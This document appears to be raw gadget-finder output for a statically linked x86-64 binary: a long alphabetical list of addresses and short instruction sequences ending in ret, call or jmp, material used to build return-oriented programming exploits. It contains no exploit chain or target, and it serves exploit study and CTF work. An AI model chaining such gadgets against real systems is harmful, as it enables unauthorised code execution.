0x0000000000491b60 : push rsi ; cli ; push 0x6e ; ja 0x491aef ; ret 0x48f
0x00000000004383e6 : push rsi ; cmc ; sub eax, edx ; ret
0x00000000004383d6 : push rsi ; hlt ; sub eax, edx ; ret
0x000000000047afc7 : push rsi ; imul edi, eax, -1 ; out 0x6b, al ; clc ; call rsi
0x00000000004383a6 : push rsi ; int1 ; sub eax, edx ; ret
0x000000000047d028 : push rsi ; movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call rsi
0x0000000000456e1e : push rsi ; or al, 0x83 ; ret
0x0000000000456dab : push rsi ; or al, 0xf6 ; ret 0xf08
0x000000000043d09d : push rsi ; or byte ptr [rbx + 0x94801e2], al ; ret 0x8948
0x0000000000490fc0 : push rsi ; pop rdx ; je 0x490f8c ; ret 0xacfc
0x000000000048ef06 : push rsi ; ret
0x000000000047d348 : push rsi ; sar dl, 1 ; jmp rsi
0x0000000000456b81 : push rsi ; sbb byte ptr [rax - 0x3f], cl ; cli ; add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x000000000044c6f0 : push rsi ; sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x00000000004383b6 : push rsi ; sub eax, edx ; ret
0x000000000041e65e : push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004993f5 : push rsp ; add byte ptr [rax], al ; pop rax ; cmc ; cli ; call rbx
0x000000000046d89a : push rsp ; and al, 0x10 ; call rdx
0x0000000000447f9f : push rsp ; and al, 0x10 ; mov dword ptr [r12], edx ; jmp 0x447f72
0x00000000004123f0 : push rsp ; and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000416276 : push rsp ; and al, 0x18 ; jmp 0x416242
0x0000000000406734 : push rsp ; and al, 0x20 ; call rax
0x000000000049ac89 : push rsp ; cld ; jmp qword ptr [rax]
0x00000000004992ec : push rsp ; cli ; jmp rax
0x0000000000465f08 : push rsp ; ret
0x000000000047d280 : push rsp ; sar edx, 1 ; jmp rsp
0x000000000047cd88 : push rsp ; stosb byte ptr [rdi], al ; cli ; jmp rsp
0x00000000004976dc : push rsp ; sub dl, bh ; call qword ptr [rdx]
0x000000000042f7e0 : pushfq ; adc eax, 0x83480000 ; ret 0xe910
0x000000000049bfd8 : pushfq ; add byte ptr [rax], 0 ; hlt ; add al, 0xfd ; call rdx
0x000000000044279a : pushfq ; and al, 0xa0 ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x000000000040d8db : pushfq ; and al, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000048c42c : pushfq ; cld ; cld ; jmp rsp
0x0000000000497334 : pushfq ; cmp edi, ecx ; jmp qword ptr [rsi]
0x00000000004304e0 : pushfq ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041c6b4 : pushfq ; or eax, 0x83480000 ; ret 0xeb10
0x0000000000476ab7 : pushfq ; ret 0xf45
0x000000000047d094 : pushfq ; sahf ; cli ; ljmp [rsi + rbx*4] ; cli ; call rdx
0x000000000047d904 : rcl byte ptr [rbx + rdi*8 - 0x46b0f01], 1 ; call qword ptr [rax]
0x000000000047d8e4 : rcl byte ptr [rbx - 0x6c0f0005], 1 ; sti ; call qword ptr [rax]
0x0000000000498030 : rcl byte ptr [rcx - 6], 1 ; call qword ptr [rdx]
0x0000000000415c7a : rcl byte ptr [rcx], cl ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000049aca0 : rcl byte ptr [rdi - 4], 1 ; jmp qword ptr [rbx]
0x000000000047d8b8 : rcl byte ptr [rdx - 0x6d2f0005], 0xfb ; jmp rax
0x0000000000440f6e : rcl dword ptr [rax + 0x48df8948], 0x83 ; ret
0x0000000000459c7b : rcl dword ptr [rbp + 0x24], 0 ; mov rax, qword ptr [rax + rsi*8] ; jmp rax
0x0000000000490fbf : rcl dword ptr [rsi + 0x5a], cl ; je 0x490f8d ; ret 0xacfc
0x000000000047df08 : rcl esi, 0xfb ; call qword ptr [rdx]
0x000000000047dee4 : rcl esi, 0xfb ; call rsp
0x000000000047de34 : rcl esi, 0xfb ; jmp rsp
0x0000000000490fbb : rcpps xmm2, xmmword ptr [rdx + 0x5a56d373] ; je 0x490f91 ; ret 0xacfc
0x000000000045f983 : rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; ret
0x0000000000415124 : rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; ret
0x0000000000405520 : rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x0000000000414753 : rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x000000000046f097 : rcr byte ptr [rbp + 0x5b], 1 ; ret
0x0000000000414771 : rcr byte ptr [rbx + 0x48], cl ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00000000004058b6 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; pop r14 ; ret
0x000000000040c02c : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x0000000000407206 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00000000004776e8 : rcr byte ptr [rbx + 0x5d], 0xc3 ; nop dword ptr [rax] ; ret
0x00000000004619ac : rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; pop r13 ; ret
0x0000000000455d0c : rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; ret
0x00000000004081f2 : rcr byte ptr [rbx + 0x5d], 1 ; ret
0x00000000004998fc : rcr byte ptr [rcx], 0 ; loopne 0x499921 ; sti ; call qword ptr [rbx]
0x00000000004913dd : rcr byte ptr [rdi + 0x6d], cl ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x000000000047a72e : rcr dword ptr [rbx + 0x5d], 1 ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000046d9e9 : rcr dword ptr [rcx], 0xc0 ; and eax, 2 ; sub eax, 1 ; ret
0x0000000000439274 : rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x0000000000439266 : rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000439f9a : rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x0000000000413501 : rep stosq qword ptr [rdi], rax ; pop rbx ; ret
0x000000000046f707 : repe cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x46f715 ; ret
0x0000000000400416 : ret
0x0000000000400627 : ret 0
0x0000000000487a60 : ret 0x10
0x000000000046717a : ret 0x101
0x000000000046f06c : ret 0x114d
0x000000000046b5ad : ret 0x1172
0x0000000000442177 : ret 0x1175
0x0000000000447e04 : ret 0x1176
0x0000000000474f51 : ret 0x145
0x0000000000461fc1 : ret 0x1477
0x0000000000438348 : ret 0x148
0x000000000040e072 : ret 0x149
0x0000000000445e18 : ret 0x14c
0x000000000042ae0c : ret 0x14d
0x000000000044261a : ret 0x1689
0x000000000043b5ee : ret 0x16e9
0x000000000041953a : ret 0x17
0x000000000041dbe6 : ret 0x1776
0x0000000000446cfd : ret 0x17e9
0x000000000042ad49 : ret 0x180f
0x000000000041d775 : ret 0x1876
0x00000000004424f0 : ret 0x1945
0x0000000000447dfb : ret 0x1a72
0x000000000049193a : ret 0x1ad4
0x00000000004900cd : ret 0x1b49
0x000000000047901f : ret 0x1be8
0x000000000041424f : ret 0x1bf
0x0000000000416a0a : ret 0x1c6
0x0000000000489730 : ret 0x1d4
0x0000000000489ec8 : ret 0x1d5
0x0000000000400b91 : ret 0x1d89
0x000000000044b449 : ret 0x1de9
0x00000000004067c3 : ret 0x1f0f
0x000000000044990d : ret 0x1fe9
0x000000000044a2f7 : ret 0x200
0x000000000043c0ac : ret 0x2044
0x0000000000474ebb : ret 0x2148
0x000000000040ad6c : ret 0x2175
0x00000000004747f7 : ret 0x22
0x000000000046a388 : ret 0x2275
0x00000000004330b8 : ret 0x2288
0x0000000000416b1a : ret 0x22a
0x000000000046c810 : ret 0x22e8
0x0000000000464bf8 : ret 0x23
0x000000000047412a : ret 0x2307
0x000000000041fb52 : ret 0x2373
0x000000000046b40a : ret 0x2393
0x000000000040da7f : ret 0x23e8
0x000000000043dcc7 : ret 0x23e9
0x0000000000488738 : ret 0x24
0x000000000040be19 : ret 0x2475
0x00000000004643e6 : ret 0x24be
0x000000000040ce14 : ret 0x2501
0x0000000000476951 : ret 0x25e9
0x000000000043ece2 : ret 0x265b
0x0000000000460076 : ret 0x2774
0x00000000004148a5 : ret 0x2775
0x0000000000453f63 : ret 0x27e9
0x0000000000421326 : ret 0x280f
0x000000000041d765 : ret 0x2876
0x000000000046a3f7 : ret 0x28f5
0x000000000040851d : ret 0x29
0x000000000045178a : ret 0x290f
0x00000000004124d2 : ret 0x2918
0x0000000000410b45 : ret 0x293c
0x000000000044eacd : ret 0x2944
0x0000000000409407 : ret 0x2948
0x000000000047692a : ret 0x2949
0x00000000004074e0 : ret 0x294c
0x000000000040b0dd : ret 0x294d
0x000000000040e62a : ret 0x2956
0x0000000000471bb1 : ret 0x2974
0x0000000000406b0a : ret 0x29cd
0x0000000000400c5a : ret 0x2a31
0x000000000043edea : ret 0x2b0
0x00000000004087fa : ret 0x2b48
0x000000000041561b : ret 0x2b74
0x0000000000413542 : ret 0x2b75
0x000000000043a412 : ret 0x2b77
0x0000000000400915 : ret 0x2b8
0x000000000047693f : ret 0x2be9
0x0000000000407eb6 : ret 0x2c20
0x000000000043ddf0 : ret 0x2d75
0x000000000045a7e2 : ret 0x30be
0x0000000000455082 : ret 0x3145
0x0000000000465e92 : ret 0x314c
0x000000000046238c : ret 0x31c3
0x0000000000453350 : ret 0x32c8
0x0000000000488c28 : ret 0x33
0x0000000000443ba8 : ret 0x3389
0x000000000044e8fe : ret 0x349
0x0000000000474cf0 : ret 0x3575
0x0000000000466e4a : ret 0x3774
0x000000000041dbc6 : ret 0x3776
0x000000000049121a : ret 0x3827
0x000000000045d05e : ret 0x3873
0x000000000041d755 : ret 0x3876
0x000000000040d74b : ret 0x389
0x000000000048f8a6 : ret 0x38ae
0x0000000000478602 : ret 0x38e8
0x0000000000473d50 : ret 0x3901
0x000000000044b72c : ret 0x3941
0x0000000000409091 : ret 0x3948
0x000000000040f300 : ret 0x3949
0x0000000000469cdc : ret 0x394c
0x0000000000445895 : ret 0x39b
0x00000000004389c2 : ret 0x3a01
0x000000000041fb3b : ret 0x3a73
0x0000000000472a23 : ret 0x3a83
0x000000000047152d : ret 0x3b01
0x00000000004393e1 : ret 0x3b48
0x000000000043bd8f : ret 0x3b8
0x000000000044631f : ret 0x3b89
0x00000000004143ca : ret 0x3be9
0x0000000000443a7f : ret 0x3ce9
0x000000000046ca74 : ret 0x3d
0x000000000046ad78 : ret 0x3d73
0x000000000046e818 : ret 0x3d74
0x00000000004133d4 : ret 0x3d83
0x0000000000466caa : ret 0x3e80
0x000000000043e14e : ret 0x4001
0x0000000000449c47 : ret 0x4002
0x00000000004059ad : ret 0x4074
0x0000000000460651 : ret 0x408d
0x0000000000449eb1 : ret 0x4101
0x000000000044f54e : ret 0x4108
0x000000000044f3ba : ret 0x4110
0x00000000004136c2 : ret 0x4173
0x000000000044238e : ret 0x41c3
0x00000000004181ba : ret 0x4266
0x000000000043b2e8 : ret 0x42a
0x000000000045db83 : ret 0x4389
0x0000000000468183 : ret 0x43e9
0x00000000004054f1 : ret 0x4401
0x0000000000455e9b : ret 0x4404
0x00000000004441bf : ret 0x445f
0x00000000004903a4 : ret 0x474c
0x00000000004637fb : ret 0x4773
0x00000000004162e6 : ret 0x4801
0x0000000000414fb9 : ret 0x4804
0x0000000000433043 : ret 0x4808
0x00000000004028c2 : ret 0x480a
0x0000000000411d76 : ret 0x4810
0x0000000000447cce : ret 0x4811
0x000000000044c147 : ret 0x481e
0x000000000044c167 : ret 0x4820
0x00000000004180c6 : ret 0x4840
0x0000000000432cf8 : ret 0x48c3
0x000000000040f3b3 : ret 0x48e9
0x0000000000491b66 : ret 0x48f
0x000000000040548c : ret 0x4901
0x0000000000445da3 : ret 0x4902
0x000000000040fe62 : ret 0x4908
0x000000000041c68c : ret 0x4910
0x000000000040c3a3 : ret 0x4a8d
0x000000000040ac5a : ret 0x4b74
0x0000000000444020 : ret 0x4c01
0x0000000000410794 : ret 0x4c10
0x00000000004915c7 : ret 0x4e27
0x000000000043cd95 : ret 0x4f01
0x000000000040159e : ret 0x4f76
0x000000000047239d : ret 0x5076
0x000000000044091f : ret 0x5089
0x000000000041fb24 : ret 0x5173
0x000000000044e7fd : ret 0x51ff
0x000000000043bfe7 : ret 0x5488
0x000000000043e0bf : ret 0x548b
0x000000000048f82c : ret 0x5508
0x000000000045e55e : ret 0x5590
0x000000000041dba6 : ret 0x5776
0x0000000000491af8 : ret 0x5803
0x0000000000446c38 : ret 0x5841
0x0000000000401319 : ret 0x589
0x000000000048f500 : ret 0x591c
0x0000000000443da3 : ret 0x5941
0x0000000000490267 : ret 0x5ae4
0x0000000000464470 : ret 0x5d74
0x0000000000491f92 : ret 0x62c1
0x0000000000467ff0 : ret 0x6349
0x000000000045959c : ret 0x634c
0x000000000046fda4 : ret 0x637f
0x0000000000448603 : ret 0x6411
0x000000000041d6e1 : ret 0x6620
0x0000000000415d08 : ret 0x66c3
0x0000000000415e68 : ret 0x672
0x000000000046b5be : ret 0x674
0x000000000041db96 : ret 0x6776
0x000000000048f51f : ret 0x67b2
0x000000000040db25 : ret 0x6874
0x00000000004687ca : ret 0x68e8
0x000000000043b69a : ret 0x6ae9
0x000000000040fc6a : ret 0x6b9
0x000000000040fab2 : ret 0x6be
0x0000000000492121 : ret 0x6f9
0x000000000040dca1 : ret 0x7401
0x0000000000414f86 : ret 0x7402
0x000000000046805a : ret 0x7403
0x000000000043c711 : ret 0x7404
0x000000000040ee53 : ret 0x7408
0x000000000040a4ad : ret 0x7420
0x00000000004525e4 : ret 0x7450
0x000000000046c7ca : ret 0x7472
0x0000000000436f29 : ret 0x7501
0x000000000040fcb8 : ret 0x7502
0x0000000000436f43 : ret 0x7504
0x0000000000438364 : ret 0x7508
0x0000000000436efb : ret 0x7510
0x0000000000436f08 : ret 0x7520
0x0000000000416a2e : ret 0x7540
0x000000000041ea12 : ret 0x7677
0x0000000000454d31 : ret 0x76e9
0x0000000000471fa2 : ret 0x774
0x000000000046dc92 : ret 0x777
0x000000000046eec6 : ret 0x77f
0x0000000000412351 : ret 0x7ae9
0x0000000000402725 : ret 0x7be9
0x000000000041d681 : ret 0x7e20
0x000000000041dafc : ret 0x7e40
0x0000000000416d6c : ret 0x7f10
0x00000000004252ee : ret 0x80
0x0000000000417f49 : ret 0x8000
0x00000000004782c2 : ret 0x8001
0x000000000044e71e : ret 0x8148
0x0000000000478818 : ret 0x8166
0x000000000044c249 : ret 0x820f
0x000000000043a785 : ret 0x8301
0x000000000041e5e0 : ret 0x830f
0x000000000044c014 : ret 0x8341
0x0000000000415c45 : ret 0x8348
0x0000000000438e40 : ret 0x8349
0x000000000046abbf : ret 0x8364
0x00000000004623f6 : ret 0x8401
0x00000000004035fb : ret 0x840f
0x000000000047556e : ret 0x8440
0x000000000040b192 : ret 0x850f
0x00000000004659b2 : ret 0x8545
0x00000000004024a5 : ret 0x8548
0x00000000004148ce : ret 0x854d
0x0000000000452c95 : ret 0x85e8
0x0000000000401372 : ret 0x860f
0x000000000040f785 : ret 0x870f
0x000000000048ee3e : ret 0x871e
0x000000000041d785 : ret 0x876
0x0000000000451c81 : ret 0x87e
0x000000000047415c : ret 0x87f6
0x00000000004025d0 : ret 0x8801
0x0000000000469cd6 : ret 0x8844
0x0000000000401dd7 : ret 0x8901
0x000000000043e9c6 : ret 0x8902
0x000000000040a22b : ret 0x8908
0x000000000044c006 : ret 0x8941
0x000000000041410f : ret 0x8944
0x0000000000408987 : ret 0x8948
0x000000000040b6ba : ret 0x8949
0x0000000000408b09 : ret 0x894c
0x000000000043c9af : ret 0x894d
0x000000000046e4cb : ret 0x894e
0x00000000004725c0 : ret 0x8b
0x0000000000442208 : ret 0x8b01
0x000000000045c432 : ret 0x8b04
0x00000000004620b3 : ret 0x8b05
0x000000000049166e : ret 0x8b36
0x000000000044a24e : ret 0x8b41
0x000000000045afe3 : ret 0x8b44
0x0000000000402fc2 : ret 0x8b48
0x00000000004092b6 : ret 0x8b49
0x000000000046e44e : ret 0x8b4a
0x0000000000405bc2 : ret 0x8b4c
0x0000000000452d5e : ret 0x8c0f
0x00000000004461cf : ret 0x8ce9
0x000000000047676f : ret 0x8d0f
0x0000000000412634 : ret 0x8d44
0x0000000000410bd1 : ret 0x8d48
0x0000000000454ce0 : ret 0x8d49
0x000000000046da49 : ret 0x8d4a
0x000000000041360d : ret 0x8d4c
0x0000000000409f45 : ret 0x8d4d
0x000000000044c022 : ret 0x8d89
0x0000000000451849 : ret 0x8e0f
0x000000000044c2ca : ret 0x8f0f
0x000000000046450c : ret 0x8f74
0x00000000004324c5 : ret 0x90c3
0x000000000043b028 : ret 0x9272
0x000000000045fc38 : ret 0x94c
0x000000000046f7d2 : ret 0x950f
0x0000000000490493 : ret 0x9576
0x0000000000414f1e : ret 0x976
0x0000000000471ba8 : ret 0x9eb
0x00000000004166bc : ret 0x9ee8
0x0000000000487260 : ret 0xa
0x00000000004983d0 : ret 0xa01
0x00000000004942dd : ret 0xa03
0x000000000043c738 : ret 0xa076
0x000000000043b564 : ret 0xa0e9
0x000000000047682e : ret 0xa4e9
0x0000000000490183 : ret 0xa514
0x000000000047692d : ret 0xa5e9
0x0000000000406824 : ret 0xa6e9
0x000000000044a18a : ret 0xa8e8
0x000000000043d34d : ret 0xabe
0x0000000000490607 : ret 0xac65
0x0000000000490fc4 : ret 0xacfc
0x000000000040971d : ret 0xb074
0x000000000043b550 : ret 0xb4e9
0x000000000044c046 : ret 0xb589
0x0000000000402588 : ret 0xb60f
0x0000000000400e84 : ret 0xb70f
0x00000000004517b3 : ret 0xb7e8
0x00000000004592d1 : ret 0xb848
0x0000000000472e3a : ret 0xb8d1
0x0000000000478682 : ret 0xb8e8
0x00000000004904ce : ret 0xb9b9
0x00000000004541b1 : ret 0xb9e8
0x0000000000468b83 : ret 0xbbe9
0x0000000000476de6 : ret 0xbc80
0x000000000044c032 : ret 0xbd89
0x0000000000454440 : ret 0xbe07
0x0000000000490224 : ret 0xbe57
0x000000000041558c : ret 0xbe9
0x0000000000417e09 : ret 0xc000
0x0000000000402abe : ret 0xc031
0x000000000044864e : ret 0xc083
0x000000000041d540 : ret 0xc085
0x0000000000453228 : ret 0xc141
0x0000000000460c89 : ret 0xc148
0x00000000004430b0 : ret 0xc149
0x000000000045688e : ret 0xc189
0x000000000043c3d2 : ret 0xc221
0x000000000041414b : ret 0xc275
0x000000000041f9f4 : ret 0xc2b2
0x000000000043a47e : ret 0xc35b
0x0000000000447ba5 : ret 0xc389
0x000000000041414d : ret 0xc3f3
0x000000000048e9c2 : ret 0xc4c3
0x000000000048fdd8 : ret 0xc4ff
0x000000000041db61 : ret 0xc540
0x000000000046ab9d : ret 0xc74
0x0000000000433400 : ret 0xc748
0x00000000004516e8 : ret 0xc789
0x0000000000454aa2 : ret 0xc931
0x00000000004435a7 : ret 0xc984
0x0000000000433011 : ret 0xc9ff
0x0000000000400831 : ret 0xca21
0x000000000048f86a : ret 0xcca7
0x000000000049194d : ret 0xcd11
0x000000000046c7d5 : ret 0xcde8
0x00000000004048f2 : ret 0xce80
0x0000000000401304 : ret 0xd
0x0000000000414a6f : ret 0xd020
0x000000000040669a : ret 0xd021
0x000000000043d6db : ret 0xd029
0x0000000000455b7c : ret 0xd089
0x000000000046cace : ret 0xd141
0x0000000000478d69 : ret 0xd1e8
0x000000000046488c : ret 0xd201
0x00000000004011a4 : ret 0xd284
0x000000000044798a : ret 0xd285
0x0000000000465bdd : ret 0xd348
0x000000000046b540 : ret 0xd589
0x0000000000441307 : ret 0xd5e9
0x000000000044b686 : ret 0xd774
0x0000000000471bda : ret 0xd775
0x00000000004913e5 : ret 0xd8f
0x000000000046c8fc : ret 0xd8f7
0x000000000043a78c : ret 0xda89
0x00000000004081a3 : ret 0xdaf7
0x000000000046462f : ret 0xdbe9
0x00000000004914c6 : ret 0xdcd9
0x0000000000490442 : ret 0xde5d
0x000000000048f1d1 : ret 0xde9e
0x0000000000417cc9 : ret 0xe000
0x0000000000499aff : ret 0xe01
0x0000000000436eb9 : ret 0xe074
0x000000000046e8dd : ret 0xe075
0x000000000040d73c : ret 0xe083
0x000000000049d1bc : ret 0xe0a
0x00000000004769f1 : ret 0xe1e9
0x000000000043eed2 : ret 0xe1eb
0x000000000047a77d : ret 0xe240
0x0000000000406250 : ret 0xe281
0x0000000000400bc5 : ret 0xe283
0x000000000044dadf : ret 0xe2e9
0x000000000046253c : ret 0xe2eb
0x000000000040f802 : ret 0xe375
0x000000000045f948 : ret 0xe575
0x0000000000453930 : ret 0xe57f
0x000000000043a472 : ret 0xe680
0x00000000004915e6 : ret 0xe71f
0x0000000000415646 : ret 0xe775
0x0000000000453b55 : ret 0xe87f
0x000000000041e1c5 : ret 0xe883
0x0000000000464ee2 : ret 0xe8c0
0x0000000000402859 : ret 0xe901
0x000000000040289b : ret 0xe902
0x00000000004330a6 : ret 0xe908
0x000000000042f646 : ret 0xe910
0x000000000044c8bd : ret 0xe920
0x0000000000443d2d : ret 0xe95b
0x000000000048f947 : ret 0xe970
0x000000000043a40a : ret 0xea81
0x0000000000400bad : ret 0xeac1
0x0000000000469406 : ret 0xeb01
0x000000000041c6ba : ret 0xeb10
0x00000000004920f8 : ret 0xec2
0x0000000000449eb8 : ret 0xed75
0x0000000000491d9a : ret 0xef32
0x00000000004765b8 : ret 0xef89
0x000000000041b4ae : ret 0xf
0x0000000000417b89 : ret 0xf000
0x000000000040c2ba : ret 0xf01
0x000000000041526c : ret 0xf02
0x0000000000412a73 : ret 0xf04
0x0000000000451b0d : ret 0xf075
0x00000000004099a3 : ret 0xf08
0x0000000000411e28 : ret 0xf0f
0x0000000000416d22 : ret 0xf10
0x0000000000454919 : ret 0xf40
0x000000000047a81e : ret 0xf400
0x000000000045ce0d : ret 0xf41
0x00000000004543a8 : ret 0xf45
0x0000000000415f49 : ret 0xf475
0x0000000000442cce : ret 0xf48
0x000000000047a7a3 : ret 0xf480
0x000000000040f713 : ret 0xf49
0x000000000044eaae : ret 0xf4c
0x0000000000454521 : ret 0xf50
0x00000000004744b5 : ret 0xf5e8
0x0000000000461b55 : ret 0xf631
0x000000000047a7cc : ret 0xf640
0x000000000040f766 : ret 0xf641
0x0000000000418146 : ret 0xf66
0x0000000000466987 : ret 0xf675
0x0000000000444c11 : ret 0xf685
0x000000000047a7f5 : ret 0xf6c0
0x000000000045cecc : ret 0xf741
0x0000000000405012 : ret 0xf748
0x000000000046dc7e : ret 0xf749
0x0000000000417a49 : ret 0xf800
0x000000000048f0b0 : ret 0xf869
0x000000000040ee03 : ret 0xf8b
0x0000000000432926 : ret 0xf8c5
0x000000000047840a : ret 0xf8df
0x00000000004647b2 : ret 0xf9bc
0x000000000047d0c4 : ret 0xfaa0
0x000000000047d0bc : ret 0xfaa1
0x000000000047d0b4 : ret 0xfaa2
0x000000000047d0ac : ret 0xfaa3
0x000000000047d0a4 : ret 0xfaa4
0x000000000047ceb0 : ret 0xfaac
0x000000000047d3a8 : ret 0xfad3
0x000000000045ee9a : ret 0xfb5a
0x0000000000417909 : ret 0xfc00
0x000000000043ff72 : ret 0xfc04
0x000000000043fdc2 : ret 0xfc06
0x0000000000416821 : ret 0xfc3
0x000000000047a870 : ret 0xfc60
0x000000000044811a : ret 0xfcc1
0x000000000047a899 : ret 0xfce0
0x00000000004690ca : ret 0xfd50
0x000000000047a8c2 : ret 0xfda0
0x00000000004177c9 : ret 0xfe00
0x000000000047a8eb : ret 0xfe20
0x000000000047a914 : ret 0xfe80
0x0000000000400cf5 : ret 0xfe83
0x0000000000417689 : ret 0xff00
0x0000000000426e61 : ret 0xff2
0x000000000043f04b : ret 0xff25
0x000000000041e389 : ret 0xff2d
0x00000000004180ea : ret 0xff3
0x000000000040fac0 : ret 0xff31
0x000000000047a754 : ret 0xff40
0x0000000000459206 : ret 0xff41
0x0000000000417549 : ret 0xff80
0x0000000000408db7 : ret 0xffb8
0x00000000004063b2 : ret 0xffc0
0x00000000004137ae : ret 0xffdf
0x000000000044a330 : ret 0xffe0
0x0000000000458b30 : ret 0xffe1
0x000000000044de20 : ret 0xffe6
0x000000000045848a : ret 0xffe7
0x000000000045a80a : ret 0xffe8
0x000000000043a79d : ret 0xffe9
0x000000000045a40a : ret 0xffec
0x0000000000407541 : ret 0xffef
0x0000000000415612 : ret 0xfff
0x0000000000406192 : ret 0xfff0
0x00000000004045ab : ret 0xfff1
0x0000000000417049 : ret 0xfff8
0x0000000000464185 : ret 0xfff9
0x0000000000445706 : ret 0xfffb
0x0000000000405e6d : ret 0xfffc
0x000000000040e935 : ret 0xfffd
0x0000000000416dc9 : ret 0xfffe
0x0000000000413414 : ret 0xffff
0x000000000041ddd5 : ret 1
0x000000000041ddfb : ret 2
0x0000000000411193 : ret 3
0x000000000041cf8e : ret 4
0x0000000000420706 : ret 5
0x00000000004102f4 : ret 6
0x000000000041cc4a : ret 7
0x000000000041de35 : ret 8
0x000000000043796a : ret 9
0x000000000047d5a1 : retf ; cli ; jmp rdx
0x000000000047d59d : retf ; cli ; push qword ptr [rdx - 0x35] ; cli ; jmp rdx
0x0000000000478003 : retf ; mov rsi, qword ptr [r14] ; call r12
0x000000000047d999 : retf ; sti ; call rax
0x000000000047d9dd : retf ; sti ; call rsi
0x0000000000438a85 : rol bl, 0x48 ; mov eax, edi ; ret
0x000000000043a573 : rol bl, 0x48 ; mov eax, edx ; pop rbx ; ret
0x000000000047843c : rol bl, 0x66 ; nop ; mov rax, qword ptr [rsi + 8] ; ret
0x000000000041d6de : rol bl, 0x83 ; ret 0x6620
0x0000000000460e8b : rol bl, 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000040ea27 : rol bl, 1 ; mov eax, 0xffffffff ; ret
0x000000000041dead : rol bl, 1 ; nop ; xor eax, eax ; ret
0x000000000043942d : rol byte ptr [r9 + 0xf], 1 ; adc dword ptr [rbx], esp ; ret
0x00000000004180c2 : rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x000000000041dbcb : rol byte ptr [rax + 0x48], 1 ; clc ; vzeroupper ; ret
0x0000000000460072 : rol byte ptr [rax + 0x49], 0x39 ; ret 0x2774
0x000000000048b100 : rol byte ptr [rax + rax], 0 ; ret 4
0x000000000041e91d : rol byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000043e9d3 : rol byte ptr [rax], 0 ; add dh, dh ; ret 0x7404
0x000000000047746e : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x0000000000407cc9 : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000041d922 : rol byte ptr [rbp + 0x664975c0], 0xf ; xlatb ; ret 0xc085
0x000000000046ca7c : rol byte ptr [rbp - 0x75], 0x5f ; adc al, 9 ; ret 0x8b48
0x000000000046d9eb : rol byte ptr [rbx - 0x177cfd20], 1 ; ret
0x000000000040ee58 : rol byte ptr [rbx - 0x6af00002], 0xc0 ; neg eax ; ret
0x00000000004610f2 : rol byte ptr [rbx], 0 ; add byte ptr [rax], al ; ret
0x000000000043a401 : rol byte ptr [rcx + 0xbeff], cl ; add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x000000000043942e : rol byte ptr [rcx + 0xf], 1 ; adc dword ptr [rbx], esp ; ret
0x00000000004543a4 : rol byte ptr [rcx + 0xf], cl ; xchg eax, esp ; ret 0xf45
0x00000000004610d2 : rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; ret
0x00000000004402a6 : rol byte ptr [rcx], 0x50 ; call rbx
0x0000000000448b2b : rol byte ptr [rcx], 0x83 ; ret 0x4801
0x000000000043a788 : rol byte ptr [rcx], 0xf ; scasd eax, dword ptr [rdi] ; ret 0xda89
0x000000000044571f : rol byte ptr [rcx], 1 ; add byte ptr [rax], al ; call 0x4019f6
0x000000000043fb41 : rol byte ptr [rcx], 1 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000461132 : rol byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x00000000004610e2 : rol byte ptr [rdx], 0 ; add byte ptr [rax], al ; ret
0x000000000046231d : rol byte ptr [rdx], 0x85 ; leave ; jne 0x462377 ; ret
0x0000000000461122 : rol byte ptr [rsi], 0 ; add byte ptr [rax], al ; ret
0x000000000041dc4f : rol ch, 1 ; std ; xlatb ; ret
0x000000000045fde6 : rol ch, cl ; std ; xlatb ; ret
0x0000000000432fbf : rol ch, cl ; std ; xlatb ; ret 0xc085
0x000000000048e9c0 : rol cl, 0xc2 ; ret
0x000000000046107c : rol dword ptr [rax + 0x1e740fe1], 1 ; ret
0x000000000041d704 : rol dword ptr [rbp + 0x315775c0], 0xc0 ; ret
0x000000000041dc43 : rol dword ptr [rbp - 0x3a378a40], 0xfd ; xlatb ; ret 0xc085
0x0000000000432a93 : rol dword ptr [rbp - 0x3a678a40], 0xfd ; xlatb ; ret 0xc085
0x000000000045166e : rol dword ptr [rcx + rdi - 0x39], 0x77 ; fadd qword ptr [rcx + rcx*4 - 0x38] ; ret
0x000000000043d017 : rol dword ptr [rcx - 0x7d], cl ; ret 0x4801
0x0000000000400899 : rol dword ptr [rcx], 0x8d ; call r11
0x000000000041e385 : rol ebp, 1 ; stc ; xlatb ; ret 0xff2d
